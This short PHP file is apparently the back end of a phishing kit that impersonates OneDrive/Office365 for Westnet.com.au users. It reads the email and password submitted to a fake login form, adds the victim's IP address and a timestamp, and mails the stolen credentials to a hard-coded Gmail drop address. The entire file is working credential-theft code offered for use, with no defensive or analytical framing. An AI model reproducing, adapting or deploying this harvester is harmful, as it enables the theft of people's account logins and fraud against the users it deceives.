<?php



if(!empty($_POST["email"]) && !empty($_POST["password"]))
{
    $ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "----------\n";
$message .= "email: ".$_POST["email"]."\n";
$message .= "pass: ".$_POST["password"]."\n";
$message .= "----------\n";
$message .= "User IP : ".$ip."\n";
$message .= "Date : ".$adddate."\n";
$message .= " - Westnet.com.au-\n";

$recipient = "debrabowers460@gmail.com";
$subject = "One Drive";
$ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");
$headers .= "Office365";
mail($recipient,$subject,$message,$headers);

}else{
    
    echo 'empty';
    
}








